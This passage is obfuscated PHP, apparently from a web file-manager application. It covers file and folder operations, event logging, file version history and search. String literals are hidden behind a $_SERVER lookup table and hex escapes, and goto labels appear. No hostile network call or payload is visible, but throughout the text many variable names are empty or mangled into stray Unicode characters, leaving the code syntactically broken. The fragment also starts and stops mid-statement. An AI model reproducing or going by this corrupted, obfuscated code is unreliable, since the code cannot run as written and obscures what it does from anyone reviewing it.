$ױ߳[8]); } public function mkfile($, $ʶĎ = '', $ʦ = REPEAT_RENAME) { $ = $this->iconvSystem($); @touch($); if ($ʶĎ) { file_put_contents($, $ʶĎ); } @chmod($, $this->pathAuth); if (is_file($)) { return $this->getPathOuter($); } $this->writeLog(__FUNCTION__ . $_SERVER[ܮ][1659], !0); return !1; } public function mkdir($, $ = REPEAT_SKIP) { $ = $this->iconvSystem($); if (is_dir($)) { return $this->getPathOuter($); } @mkdir($, $this->pathAuth, !0); @chmod($, $this->pathAuth); if (is_dir($)) { return $this->getPathOuter($); } $this->writeLog(__FUNCTION__ . $_SERVER[ܮ][1659], !0); return !1; } public function copyFile($, $) { $this->mkdir($this->pathFather($)); $ = $this->iconvSystem($); $ = $this->iconvSystem($); $ = copy_64($, $); @chmod($, $this->pathAuth); if ($) { return $this->getPathOuter($); } $this->writeLog(__FUNCTION__ . $_SERVER[ܮ][1659], !0); return !1; } public function moveFile($, $) { $this->mkdir($this->pathFather($)); $ = $this->iconvSystem($); $ = $this->iconvSystem($); $ݗ = intval(@rename($, $)); if (!$ݗ) { if ($ݗ = intval(@copy_64($, $))) { @unlink($); } } @chmod($, $this->pathAuth); if ($ݗ) { return $this->getPathOuter($); } $this->writeLog(__FUNCTION__ . $_SERVER[ܮ][1659], !0); return !1; } public function movePath($˘, $籫, $ = false) { $ =& $_SERVER[ܮ]; $˘ = $this->iconvSystem($˘); $籫 = $this->iconvSystem($籫); $́ = rtrim($籫, $[8]) . $[8] . ($ ? $ : get_path_this($˘)); if (file_exists($́)) { return !1; } $̻ = intval(@rename($˘, $́)); $̻ = file_exists($́); if ($̻) { return $this->getPathOuter($́); } $this->writeLog(__FUNCTION__ . $[1659], !0); return !1; } public function delFile($ɏ伔) { $ɏ伔 = $this->iconvSystem($ɏ伔); if (!@unlink($ɏ伔)) { @chmod($ɏ伔, $this->pathAuth); if (@unlink($ɏ伔)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[ܮ][1659], !0); return !1; } return !0; } public function delFolder($) { $ʹ =& $_SERVER[ܮ]; $ = $this->iconvSystem($); if (!is_dir($)) { return !0; } if (!($ = opendir($))) { return !1; } while (($ = readdir($)) !== !1) { if ($ == $ʹ[10] || $ == $ʹ[1469]) { continue; } $ = $ . $ʹ[8] . $; if (is_file($) || is_link($)) { if (!unlink($)) { chmod($, $this->pathAuth); if (!unlink($)) { return !1; } } } else { if (is_dir($)) { chmod($, $this->pathAuth); $ = $this->iconvApp($); if (!$this->delFolder($)) { return !1; } } } } closedir($); return rmdir($); } public function rename($ȼ, $ؤ) { $ٻ =& $_SERVER[ܮ]; $ = $this->fileNameAuto($this->pathFather($ȼ), $ؤ); $ = $this->iconvSystem($); $ȼ = $this->iconvSystem($ȼ); $݉ = $this->pathFather($ȼ); $ = rtrim($݉, $ٻ[8]) . $ٻ[8] . $; $񴶄 = @rename($ȼ, $); $ = $this->iconvApp($); if ($񴶄) { return $this->getPathOuter($); } $this->writeLog(__FUNCTION__ . $ٻ[1659], !0); return !1; } public function size($̟) { $̟ = $this->iconvSystem($̟); return filesize_64($̟); } public function info($) { $ = $this->iconvSystem($); if ($this->isFolder($)) { return $this->folderInfo($); } else { if ($this->isFile($)) { return $this->fileInfo($); } } return !1; } protected function infoChildren($ԍ, &$߸, $ӷ = true) { $֦ =& $_SERVER[ܮ]; check_abort_echo(); $ԍ = rtrim($ԍ, $֦[8]) . $֦[8]; if ($ӷ) { $ԍ = $this->iconvSystem($ԍ); } if (!($ = @opendir($ԍ))) { return; } while (($ = readdir($)) !== !1) { if ($ == $֦[10] || $ == $֦[1469]) { continue; } $ = $ԍ . $; if (is_file($) || is_link($)) { $߸[$֦[80]]++; $߸[$֦[79]] += filesize_64($); } else { if (is_dir($)) { $߸[$֦[81]]++; $this->infoChildren($, $߸, !1); } } } closedir($); } private function folderInfo($, $۫ = false) { $Ư =& $_SERVER[ܮ]; $ = rtrim($, $Ư[8]) . $Ư[8]; $͛ = $this->iconvApp($this->pathThis($)); if ($۫) { return array($Ư[32] => $͛, $Ư[87] => $this->getPathOuter($), $Ư[33] => $Ư[78]); } $ = array($Ư[32] => $͛, $Ư[87] => $this->getPathOuter($), $Ư[33] => $Ư[78], $Ư[231] => @filectime($), $Ư[88] => @filemtime($), $Ư[1663] => @fileatime($), $Ư[1664] => is_readable($), $Ư[1665] => is_writable($), $Ư[1666] => get_mode($)); return $; } private function fileInfo($Κ, $㑕 = false) { $ =& $_SERVER[ܮ]; $򆒔 = $this->iconvApp($this->pathThis($Κ)); if ($㑕) { return array($[32] => $򆒔, $[87] => $this->getPathOuter($Κ), $[33] => $[230], $[79] => $this->size($Κ), $[166] => $this->ext($򆒔)); } $ = array($[32] => $򆒔, $[87] => $this->getPathOuter($Κ), $[33] => $[230], $[231] => @filectime($Κ), $[88] => @filemtime($Κ), $[1663] => @fileatime($Κ), $[79] => $this->size($Κ), $[166] => $this->ext($򆒔), $[1664] => is_readable($Κ), $[1665] => is_writable($Κ), $[1666] => get_mode($Κ)); return $; } public function exist($) { $ = $this->iconvSystem($); return @file_exists($); } public function isFile($) { $ = $this->iconvSystem($); return @is_file($); } public function isFolder($Žਕ) { $Žਕ = $this->iconvSystem($Žਕ); return @is_dir($Žਕ); } public function listPath($婸Ł, $Ԩ = false) { $ =& $_SERVER[ܮ]; $婸Ł = $this->iconvSystem($婸Ł); $婸Ł = rtrim($婸Ł, $[8]) . $[8]; $ұ = array($[85] => array(), $[86] => array()); if (!($߇ = @opendir($婸Ł))) { return $ұ; } while (($ɘ = readdir($߇)) !== !1) { if ($ɘ == $[10] || $ɘ == $[1469]) { continue; } $ڀ = $婸Ł . $ɘ; if (is_file($ڀ)) { $ұ[$[86]][] = $this->fileInfo($ڀ, $Ԩ); } else { $ұ[$[85]][] = $this->folderInfo($ڀ, $Ԩ); } } closedir($߇); return $ұ; } public function listAll($, &$֍ = array()) { $ =& $_SERVER[ܮ]; $ = $this->iconvSystem($); $ = rtrim($, $[8]) . $[8]; if (!($݊ = @opendir($))) { return $֍; } while (($ = readdir($݊)) !== !1) { if ($ == $[10] || $ == $[1469]) { continue; } $ = $ . $; $ý = is_dir($) && !is_link($) ? 1 : 0; $ = $ý ? $ . $[8] : $; $֍[] = array($[87] => $this->getPathOuter($), $[78] => $ý, $[88] => intval(@filemtime($)), $[79] => $ý ? 0 : intval($this->size($))); if ($ý) { $this->listAll($, $֍); } } closedir($݊); return $֍; } public function has($ݷٱ, $ = false, $ = true) { $ =& $_SERVER[ܮ]; $ݷٱ = $this->iconvSystem($ݷٱ); $ݷٱ = rtrim($ݷٱ, $[8]) . $[8]; if (!($ȶ = @opendir($ݷٱ))) { return !1; } $ = 0; $Ё = 0; $΋ = 0; while (($͚ȩ = readdir($ȶ)) !== !1) { if ($͚ȩ == $[10] || $͚ȩ == $[1469]) { continue; } $ = $ݷٱ . $͚ȩ; if ($) { $΋++; if (@is_file($)) { $++; } else { $Ё++; } if ($΋ > 10000) { break; } continue; } if ($) { if (@is_file($)) { return !0; } } else { if (@is_dir($ . $[8])) { return !0; } } } closedir($ȶ); if ($) { return array($[239] => $, $[240] => $Ё); } return !1; } public function hashSimple($ҩ) { $ =& $_SERVER[ܮ]; if (!$ҩ) { return md5($[12]); } $ҩ = $this->iconvSystem($ҩ); $̸ = $this->size($ҩ); $ = 200; $òį = 50; if ($̸ <= $ * $òį) { return $this->hashMd5($ҩ) . $̸; } $ɯ = $[12]; $ܚ = intval($̸ / $òį); $ = fopen($ҩ, $[1667]); if (!$) { return $ɯ; } for ($𞠥 = 0; $𞠥 < $òį; $𞠥++) { fseek_64($, $ܚ * $𞠥); $ɯ .= fread($, $); } fseek_64($, $̸ - $); $ɯ .= fread($, $); fclose($); return md5($ɯ) . $̸; } public function getContent($) { $ = $this->iconvSystem($); return file_get_contents($); } public function setContent($, $ = '') { $ = $this->iconvSystem($); $ = @file_put_contents($, $, LOCK_EX); if (!$) { $this->writeLog(__FUNCTION__ . $_SERVER[ܮ][1659], !0); } clearstatcache(); @chmod($, $this->pathAuth); return $ === !1 ? !1 : !0; } public function fileSubstr($ݐ, $ = 0, $ۃ = false) { $ =& $_SERVER[ܮ]; $ݐ = $this->iconvSystem($ݐ); if ($ۃ === !1) { $ۃ = $this->size($ݐ); } if ($ۃ <= 0) { return $[12]; } $ = fopen($ݐ, $[1667]); if (!$) { return !1; } fseek_64($, $); $ڀ = fread($, $ۃ); fclose($); if (!$ڀ) { $this->writeLog(__FUNCTION__ . $[1659], !0); } return $ڀ; } public function upload($莲, $ݻ, $Σ = false, $֙ћ = REPEAT_REPLACE) { if (!$ݻ || !@file_exists($ݻ)) { return !1; } if ($Σ) { return $this->moveFile($ݻ, $莲); } return $this->copyFile($ݻ, $莲); } public function setModifyTime($, $̿Î = '') { @touch($, intval($̿Î)); } public function download($Ī, $) { return $this->iconvSystem($Ī); } } goto d; Cꩃߪ: class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\165\162\143\145\137\145\x76\x65\156\164"; protected $dataAuto = array(array("\x63\x72\145\141\164\x65\124\151\155\x65", "\164\151\x6d\145", "\x69\x6e\x73\x65\162\x74", "\x66\165\x6e\x63\164\151\x6f\156"), array("\144\145\163\x63", '', "\151\x6e\x73\145\x72\164\x2c\165\160\x64\x61\x74\x65\x2c\x73\145\x6c\145\143\x74", "\x6a\x73\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($蚿, $ۍ, $ = '') { $ɵ =& $_SERVER[ܮ]; if (!$this->eventSave) { return; } $ތɤ = Model($ɵ[1534])->sourceInfo($蚿); if (!$ތɤ) { return !1; } if ($this->isDisableEvent($ތɤ, $ۍ)) { return; } if ($ && is_string($)) { $ = array($ɵ[2222] => $); } $̿ = KodUser::id(); $֢ = array($ɵ[506] => $蚿, $ɵ[2412] => $ތɤ[$ɵ[190]], $ɵ[2413] => $ތɤ[$ɵ[32]], $ɵ[602] => !empty($ތɤ[$ɵ[602]]) ? $ތɤ[$ɵ[602]] : $ɵ[12], $ɵ[1968] => $̿, $ɵ[511] => $ۍ, $ɵ[1970] => $); $this->addSystemLog($ۍ, $֢); unset($֢[$ɵ[2413]], $֢[$ɵ[602]]); return $this->add($֢); } private function addSystemLog($, $) { $ =& $_SERVER[ܮ]; if ($ == $[2414]) { $ = $[$[540]][$[2415]]; } else { if (in_array($, array($[1563], $[2416]))) { $ = $[$[540]][$[168]]; } } $ = array_merge($, array($[2417] => $[$[191]], $[2418] => $[$[2418]])); Hook::trigger($[2419], $[2420] . $, $); Model($[2129])->addLog($[2420] . $, $); } private function isDisableEvent($ҝڶ, $ԝ) { $ =& $_SERVER[ܮ]; if ($ҝڶ[$[188]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($ԝ == $[1334]) { return !1; } return !0; } public function eventCreate($󒩂, $푐݄) { $ =& $_SERVER[ܮ]; $ӡ = Model($[1534])->sourceInfo($󒩂); $ = array($[2415] => $푐݄, $[32] => $ӡ[$[32]]); return $this->addEvent($󒩂, $[2414], $); } public function eventFileEdit($ك) { $ۺ =& $_SERVER[ܮ]; $؇ = array($ۺ[2421] => $_SERVER[$ۺ[2422]], $ۺ[2423] => strtolower(ACTION)); if (isset($GLOBALS[$ۺ[7]][$ۺ[1624]])) { $؇[$ۺ[1624]] = $ۺ[91]; } return $this->addEvent($ك, $ۺ[1562], $؇); } public function eventRecycle($, $) { return $this->addEvent($, $_SERVER[ܮ][2416], $); } private static $_removeLast = ''; public function eventRemove($) { $ =& $_SERVER[ܮ]; self::$_removeLast = $; $ = Model($[1534])->sourceInfo($); $ = array_field_key($, array($[191], $[557], $[520], $[604])); $ = array($[168] => $[$[32]], $[2423] => ACTION, $[2424] => $); return $this->addEvent($[$[190]], $[1334], $); } public function eventShare($ī, $ʸ㭳) { return $this->addEvent($ī, $_SERVER[ܮ][1563], $ʸ㭳); } public function eventMove($, $Ͽ, $֘) { $ی =& $_SERVER[ܮ]; if (self::$_removeLast == $) { return; } $Ŋ = Model($ی[1534]); $ = $Ŋ->sourceInfo($); $մ = $Ŋ->sourceInfo($Ͽ); $ʱ = $Ŋ->sourceInfo($֘); $ = array($ی[1346] => $Ͽ, $ی[2425] => $մ[$ی[32]], $ی[2383] => !empty($մ[$ی[602]]) ? $մ[$ی[602]] : $ی[12], $ی[1347] => $֘, $ی[2426] => $ʱ[$ی[32]], $ی[2427] => !empty($ʱ[$ی[602]]) ? $ʱ[$ی[602]] : $ی[12]); $this->addEvent($, $ی[643], $); $ = $Ŋ->sourceInfo($); $ = array($ی[191] => $[$ی[191]], $ی[32] => $[$ی[32]]); $this->addEvent($Ͽ, $ی[2428], $); } public function eventCopy($) { $this->eventCreate($, $_SERVER[ܮ][641]); } public function eventRename($, $ݛ, $) { $ۨ =& $_SERVER[ܮ]; $ʢ = array($ۨ[1346] => $ݛ, $ۨ[1347] => $); return $this->addEvent($, $ۨ[1547], $ʢ); } public function eventAddComment($, $) { return $this->addEvent($, $_SERVER[ܮ][2429], $); } public function eventAddDesc($Ɩ, $饓˃) { return $this->addEvent($Ɩ, $_SERVER[ܮ][2430], $饓˃); } public function listBySource($) { $ =& $_SERVER[ܮ]; $褐 = Model($[1534])->sourceInfo($); $݀ = array($[506] => $); if ($褐[$[500]] == $[91]) { $ћ = 20000; $ƞ = array($[604] => array($[473], $褐[$[604]] . $褐[$[191]] . $[636])); $톮 = Model($[1534])->field($[191])->order($[2431])->where($ƞ)->limit($ћ)->select(); $Ʋܯ = array_to_keyvalue($톮, $[12], $[191]); if ($Ʋܯ >= $ћ) { $ = Model($[1534])->listChildrenDeep($, $ћ, 3); $Ʋܯ = array_merge($Ʋܯ, $, array($ . $[463])); } $݀ = array($[191] => array($[7], array_unique($Ʋܯ))); } $ԍ = $this->where($݀)->order($[2432])->selectPage(); if ($ԍ[$[443]][$[444]] == 0) { $ԍ[$[443]][$[444]] = 1; $ԍ[$[446]] = array(array($[506] => $, $[2412] => $褐[$[190]], $[1968] => $褐[$[541]], $[511] => $[2433], $[512] => $褐[$[231]], $[1970] => $[12])); } return $this->eventListParse($ԍ, $); } private function eventListParse($, $×) { $ƭ =& $_SERVER[ܮ]; $Ǣ = $[$ƭ[446]]; $ư = array_to_keyvalue($Ǣ, $ƭ[12], $ƭ[191]); $ʳ = array_to_keyvalue($Ǣ, $ƭ[12], $ƭ[2418]); foreach ($Ǣ as $ׯ) { $ = $ׯ[$ƭ[540]]; if ($ׯ[$ƭ[33]] == $ƭ[643] && isset($[$ƭ[1346]])) { $ư[] = $[$ƭ[1346]] . $ƭ[12]; $ư[] = $[$ƭ[1347]] . $ƭ[12]; } if ($ׯ[$ƭ[33]] == $ƭ[2428] && isset($[$ƭ[191]])) { $ư[] = $[$ƭ[191]] . $ƭ[12]; } } $ư = array_merge($ư, $ʳ, array($× . $ƭ[12])); $ư = array_unique($ư); $ռ = array_unique(array_to_keyvalue($Ǣ, $ƭ[12], $ƭ[1593])); $΄Ĥ = Model($ƭ[617])->userListInfo($ռ); $ = Model($ƭ[939])->sourceListInfo($ư, !0); foreach ($Ǣ as &$ׯ) { if ($ׯ[$ƭ[33]] == $ƭ[643] && isset($ׯ[$ƭ[540]][$ƭ[1346]])) { $ׯ[$ƭ[540]][$ƭ[1346]] = $[$ׯ[$ƭ[540]][$ƭ[1346]]]; $ׯ[$ƭ[540]][$ƭ[1347]] = $[$ׯ[$ƭ[540]][$ƭ[1347]]]; } if ($ׯ[$ƭ[33]] == $ƭ[2428] && isset($ׯ[$ƭ[540]][$ƭ[191]])) { $ׯ[$ƭ[540]][$ƭ[191]] = $[$ׯ[$ƭ[540]][$ƭ[191]]]; } $ׯ[$ƭ[90]] = $[$ׯ[$ƭ[191]]]; $ׯ[$ƭ[2434]] = $[$ׯ[$ƭ[2418]]]; if ($ׯ[$ƭ[33]] == $ƭ[1334]) { $ׯ[$ƭ[2434]] = $ׯ[$ƭ[90]]; $ׯ[$ƭ[2418]] = $ׯ[$ƭ[2434]][$ƭ[191]]; $ׯ[$ƭ[90]] = !1; $ׯ[$ƭ[191]] = $ƭ[12]; } $ׯ[$ƭ[2357]] = $΄Ĥ[$ׯ[$ƭ[1593]]]; } unset($ׯ); $[$ƭ[446]] = $Ǣ; return $; } public function removeBySource($س) { $ = array($_SERVER[ܮ][506] => $س); $this->where($)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\x6f\x75\x72\143\x65\x5f\150\x69\163\164\x6f\162\171"; public function historyCount($߯) { $Ʉ =& $_SERVER[ܮ]; if (!$߯) { return array(); } if (is_string($߯) || is_int($߯)) { $߯ = array($߯); } $ = array($Ʉ[191], $Ʉ[955] => $Ʉ[585]); $ = array($Ʉ[191] => array($Ʉ[7], $߯)); $ = $this->field($)->where($)->group($Ʉ[191])->select(); return array_to_keyvalue($, $Ʉ[191], $Ʉ[585]); } public function addHistory($ܟ, $ = '') { $ =& $_SERVER[ܮ]; $ۗ = array($[506] => $ܟ[$[191]], $[1968] => isset($ܟ[$[543]]) ? $ܟ[$[543]] : $ܟ[$[541]], $[558] => $ܟ[$[557]], $[640] => $ܟ[$[79]], $[2435] => $); if ($GLOBALS[$[6]][$[92]][$[1408]] >= 1) { $this->historyAutoClear($ۗ[$[191]]); $this->add($ۗ); } Hook::trigger($[2436], $ۗ); Model($[2437])->eventFileEdit($ܟ[$[191]]); } private function historyAutoClear($ұմ) { $󔻖 =& $_SERVER[ܮ]; $ = Model($󔻖[871])->get($󔻖[967]); $і = intval($GLOBALS[$󔻖[6]][$󔻖[92]][$󔻖[1408]]); $Ӌ = $ == $󔻖[968] ? min(5, $і) : $і; $Ӌ = $Ӌ <= 0 ? 0 : $Ӌ - 1; if ($Ӌ >= 499) { return; } $ﻉ = array($󔻖[506] => $ұմ); $ = $this->field($󔻖[2438])->where($ﻉ)->order($󔻖[2432])->select(); if (!$ || $Ӌ >= count($)) { return; } $ = array_to_keyvalue($, $󔻖[12], $󔻖[487]); $ = array_slice($, $Ӌ); $ = array_to_keyvalue($, $󔻖[12], $󔻖[557]); $ = array_slice($, $Ӌ); if (!$ || !$) { return; } $ﻉ = array($󔻖[508] => array($󔻖[7], $)); $this->where($ﻉ)->delete(); Model($󔻖[560])->remove($); } public function listData($) { $Ϯ =& $_SERVER[ܮ]; $ބ = array($Ϯ[506] => $); $ʍӮ = $Ϯ[2439]; $Ǝì = $this->field($ʍӮ)->where($ބ)->order($Ϯ[2432])->selectPage(); $this->_listAppendUser($Ǝì[$Ϯ[446]]); $ߌ = Model($Ϯ[871])->get($Ϯ[967]); $诒 = 5; if ($ߌ == $Ϯ[968]) { $Ǝì[$Ϯ[446]] = array_slice($Ǝì[$Ϯ[446]], 0, $诒); $Ǝì[$Ϯ[443]] = array($Ϯ[2440] => 1, $Ϯ[2441] => 20, $Ϯ[2442] => 1, $Ϯ[2331] => count($Ǝì[$Ϯ[446]])); } return $Ǝì; } protected function _listAppendUser(&$) { $앪 =& $_SERVER[ܮ]; $ݐ = array_to_keyvalue($, $앪[12], $앪[1593]); $ҏ = Model($앪[617])->userListInfo($ݐ); foreach ($ as &$) { $о = $[$앪[1593]]; $[$앪[541]] = $ҏ[$о] ? $ҏ[$о] : !1; } unset($); } public function fileInfo($沭, $Ȝ = false) { $ =& $_SERVER[ܮ]; $߉ = $this->tablePrefix; $ = "{$߉}\151\157\x5f\x66\x69\x6c\x65\40\x66\x69\x6c\x65\163\x20\x6f\156\40\146\x69\154\145\x73\x2e\146\151\154\x65\111\x44\40\x3d\x20\150\151\x73\x74\x6f\x72\171\56\146\151\x6c\145\111\104"; $ٕ = $this->alias($[2443])->where(array($[508] => $沭))->join($, $[2444])->find(); if ($ٕ && $Ȝ) { $ā = array($[191] => $ٕ[$[191]], $[487] => array($[1181], $沭)); $ٕ[$[1865]] = $this->where($ā)->count(); } return $ٕ; } public function removeItem($) { $ࣅ =& $_SERVER[ܮ]; $ = array($ࣅ[508] => $); $̍ = $this->where($)->find(); if ($̍) { $ = $this->where($)->delete(); Model($ࣅ[560])->remove($̍[$ࣅ[557]]); return $; } return !1; } public function removeBySource($ǂ) { $ =& $_SERVER[ܮ]; if (!$ǂ) { return !1; } if (!is_array($ǂ)) { $ǂ = array($ǂ); } $ = array($[506] => array($[7], $ǂ)); $ޚ = $this->field($[558])->where($)->select(); if ($ޚ) { $this->where($)->delete(); $꡵ = array_to_keyvalue($ޚ, $[12], $[557]); Model($[560])->remove($꡵); } return !0; } public function setDetail($ϭ, $ƽ) { $ =& $_SERVER[ܮ]; return $this->where(array($[508] => $ϭ))->save(array($[2435] => $ƽ)); } public function rollbackToItem($̶, $̟) { $ʦ =& $_SERVER[ܮ]; $͠ = Model($ʦ[939])->sourceInfo($̶); $this->addHistory($͠, LNG($ʦ[2445])); $ = $this->find($̟); $ = array($ʦ[557] => $[$ʦ[557]], $ʦ[79] => $[$ʦ[79]], $ʦ[88] => time(), $ʦ[543] => USER_ID); Model($ʦ[939])->where(array($ʦ[191] => $̶))->save($); return $this->where(array($ʦ[508] => $̟))->delete(); } public function clearSame($ڗܞ) { $К =& $_SERVER[ܮ]; $ = $this->listData($ڗܞ); $ = array_to_keyvalue_group($, $К[557]); $꿚 = array(); $ۦ = array(); foreach ($ as $Ւֻ) { if (!$Ւֻ || count($Ւֻ) <= 1) { continue; } foreach ($Ւֻ as $՞) { $꿚[] = $՞[$К[557]]; $ۦ[] = $՞[$К[487]]; } } if (!$ۦ) { return; } $this->where(array($К[487] => array($К[7], $ۦ)))->delete(); Model($К[560])->remove($꿚); } public function userSpace() { $޹ =& $_SERVER[ܮ]; $ = $this->tablePrefix; $ߙ = array($޹[1968] => USER_ID); $ۺȖ = "{$}\151\157\137\146\151\154\145\x20\146\x69\x6c\x65\x73\x20\157\156\40\146\x69\154\x65\x73\x2e\146\x69\154\145\111\x44\x20\x3d\x20\150\x69\x73\164\157\162\171\x2e\x66\x69\x6c\145\111\104"; return $this->alias($޹[2443])->where($ߙ)->join($ۺȖ, $޹[2444])->sum($޹[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($րٔ) { $Ղŧ =& $_SERVER[ܮ]; $׍ = KodIO::fileTypeList(); $ж = $׍[$րٔ]; if (!$ж) { return array(); } $ = $ж[$Ղŧ[166]]; $ = $Ղŧ[7]; if (!$ж[$Ղŧ[166]]) { $؍ = array_to_keyvalue($׍, $Ղŧ[12], $Ղŧ[166]); $ = implode($Ղŧ[50], $؍); $ = $Ղŧ[2446]; } $، = explode($Ղŧ[50], trim($, $Ղŧ[50])); return array($, $،); } public function listPathType($ب) { $ڲ =& $_SERVER[ܮ]; $Ɍ = $this->fileTypeWhere($ب); if (!$Ɍ) { return array(); } $ۗő = USER_ID; $ѽ݄ = Model($ڲ[617])->getInfo($ۗő); $ = array($ڲ[670] => SourceModel::TYPE_USER, $ڲ[604] => array($ڲ[635], $ڲ[613] . $ѽ݄[$ڲ[90]][$ڲ[191]] . $ڲ[636]), $ڲ[671] => $ۗő, $ڲ[668] => 0, $ڲ[669] => $Ɍ); return $this->listSource($); } public function listSearch($߭, $Ӓ = 300) { $ߩ =& $_SERVER[ܮ]; if (isset($߭[$ߩ[2280]]) && $߭[$ߩ[2280]]) { $߭[$ߩ[2280]] = str_replace($ߩ[474], $ߩ[2447], trim($߭[$ߩ[2280]])); } $ｔ = $this->_parseSearchWhere($߭); if (!isset($ｔ[$ߩ[520]])) { $ｔ[$ߩ[520]] = 0; } $Ҏ = $ߩ[2448]; $ = $ｔ; $喧ه = $Ҏ; $this->_listSearchBindPinyin($߭, $ｔ, $Ҏ); $this->alias($ߩ[533])->_makeOrder(); $ｔ = $this->parseWhereLike($ｔ); $ = $this->distinct(!0)->field($Ҏ)->where($ｔ)->selectPage($Ӓ); if ($GLOBALS[$ߩ[6]][$ߩ[468]][$ߩ[469]] && Input::check($߭[$ߩ[2280]], $ߩ[677]) && $[$ߩ[443]][$ߩ[428]] == 1 && $[$ߩ[443]][$ߩ[444]] == 0) { $ = $this->distinct(!0)->field($Ҏ)->where($)->limit(1000)->select(); $ = array_page_split($, !1, $Ӓ); } $this->_listSearchFileContent($, $߭, $喧ه, $); $this->_listSearchDesc($, $߭, $喧ه); $this->_listSearchTag($, $߭, $喧ه); $this->_listSearchGroupTag($, $߭, $喧ه); $this->_listDataApply($[$ߩ[446]]); $this->_listMake($); return $; } private function _listSearchFileContent(&$, $, $, $Ў) { $ý =& $_SERVER[ܮ]; if (!$[$ý[2280]] || $[$ý[443]][$ý[428]] > 1) { return; } if (!isset($Ў[$ý[32]]) || !is_array($[$ý[557]]) || !$[$ý[557]]) { return; } $Ў[$ý[557]] = array($ý[7], $[$ý[557]]); unset($Ў[$ý[32]]); unset($[$ý[557]]); $ȞЪ = $this->field($)->where($Ў)->limit($ý[2449])->select(); $ȞЪ = array_to_keyvalue($ȞЪ, $ý[191], $ý[12]); $ = array_to_keyvalue($[$ý[446]], $ý[191], $ý[12]); $ = array(); foreach ($ȞЪ as $逝 => $ˉ) { if (!$[$逝]) { $[] = $ˉ; } } if (!$) { return; } $[$ý[446]] = array_merge($, $[$ý[446]]); $[$ý[443]][$ý[444]] += count($); } private function _listSearchTag(&$ǃ, $, $Ҡ) { $虨 =& $_SERVER[ܮ]; if (empty($[$虨[2143]]) || !in_array($虨[2450], $[$虨[2143]])) { return; } if (!$[$虨[2280]] || $ǃ[$虨[443]][$虨[428]] > 1) { return; } $ = Model($虨[2451])->listData(); $渻 = array(); $ = $[$虨[2280]]; foreach ($ as $枴) { $紎 = $枴[$虨[32]]; $ = str_replace($虨[53], $虨[12], Pinyin::get($紎)); if (stripos($紎, $) !== !1 || stripos($, $) !== !1) { $渻[] = $枴[$虨[487]]; } } if (!$渻) { return; } $亐 = array($虨[515] => array($虨[7], $渻), $虨[1593] => USER_ID); $ = Model($虨[517])->field($虨[87])->where($亐)->select(); $ = array_to_keyvalue($, $虨[12], $虨[87]); $ = array_unique($); $this->_listSearchMerge($ǃ, $, $Ҡ, $); } private function _listSearchDesc(&$Ō, $É, $ԓҦ) { $ɍޞ =& $_SERVER[ܮ]; if (empty($É[$ɍޞ[2143]]) || !in_array($ɍޞ[540], $É[$ɍޞ[2143]])) { return; } if (!$É[$ɍޞ[2280]] || $Ō[$ɍޞ[443]][$ɍޞ[428]] > 1) { return; } $ = array($ɍޞ[95] => $ɍޞ[540], $ɍޞ[451] => array($ɍޞ[473], $ɍޞ[2282] . $É[$ɍޞ[2280]] . $ɍޞ[2282])); $ = !1; if ($) { $Ơ = $this->listSearchChildren($É[$ɍޞ[190]]); $Ơ = array_unique($Ơ); if (!$Ơ) { return; } $[$ɍޞ[191]] = array($ɍޞ[7], $Ơ); } $ݩ = Model($ɍޞ[471])->field($ɍޞ[191])->where($)->limit(5000)->select(); $А = array_to_keyvalue($ݩ, $ɍޞ[12], $ɍޞ[191]); $this->_listSearchMerge($Ō, $É, $ԓҦ, $А); } private function _listSearchGroupTag(&$σ, $ޗ, $Ø) { $ťŉ =& $_SERVER[ܮ]; if (empty($ޗ[$ťŉ[2143]]) || !in_array($ťŉ[2450], $ޗ[$ťŉ[2143]])) { return; } if (!$ޗ[$ťŉ[2280]] || $σ[$ťŉ[443]][$ťŉ[428]] > 1 || !$ޗ[$ťŉ[190]]) { return; } $Ҧ = $this->sourceInfo($ޗ[$ťŉ[190]]); if (!$Ҧ || $Ҧ[$ťŉ[188]] != SourceModel::TYPE_GROUP) { return; } $ = $Ҧ[$ťŉ[589]]; $ = Model($ťŉ[2452])->get($); $Ъ = array(); $Ք = $ޗ[$ťŉ[2280]]; foreach ($[$ťŉ[446]] as $ؓ) { $ = $ؓ[$ťŉ[32]]; $޳ = str_replace($ťŉ[53], $ťŉ[12], Pinyin::get($)); if (stripos($, $Ք) !== !1 || stripos($޳, $Ք) !== !1) { $Ъ[] = $ؓ[$ťŉ[487]]; } } if (!$Ъ) { return; } $ߑΎ = array($ťŉ[515] => array($ťŉ[7], $Ъ), $ťŉ[1593] => 0, $ťŉ[33] => $ťŉ[1492] . $); $ҩ = Model($ťŉ[517])->field($ťŉ[87])->where($ߑΎ)->select(); $ҩ = array_to_keyvalue($ҩ, $ťŉ[12], $ťŉ[87]); $ = array_unique($ҩ); $this->_listSearchMerge($σ, $ޗ, $Ø, $); } private function _listSearchMerge(&$Րǉ, $, $Վ, $֡) { $Ć =& $_SERVER[ܮ]; if (!$֡) { return; } $ŷѵ = array_to_keyvalue($Րǉ[$Ć[446]], $Ć[12], $Ć[191]); $ˌ = array_diff($֡, $ŷѵ); if (!$ˌ) { return; } $ޥӸ = array($Ć[191] => array($Ć[7], $ˌ)); $ = $this->field($Վ)->where($ޥӸ)->select(); if (!$) { return; } $猟 = array(); foreach ($ as $ׁֈ) { if ($this->_listSearchFilter($ׁֈ, $)) { $猟[] = $ׁֈ; } } $Րǉ[$Ć[446]] = array_merge($猟, $Րǉ[$Ć[446]]); $Րǉ[$Ć[443]][$Ć[444]] += count($猟); } private function _listSearchFilter($, $«) { $ =& $_SERVER[ܮ]; $ѾЧ = $[$[500]] == $[91]; if (!strstr($[$[604]], $[50] . $«[$[190]] . $[50])) { return !1; } if (isset($«[$[501]]) && $«[$[501]] != $[950]) { if ($«[$[501]] == $[78] && !$ѾЧ) { return !1; } if ($«[$[501]] != $[78] && $ѾЧ) { return !1; } if (!strstr($[$[166]], $[50] . $«[$[501]] . $[50])) { return !1; } } if (isset($«[$[2453]]) && $«[$[2453]] < $[$[79]]) { return !1; } if (isset($«[$[2454]]) && $«[$[2454]] > $[$[79]]) { return !1; } if (isset($«[$[684]]) && $«[$[684]] != $[$[543]]) { return !1; } return !0; } public 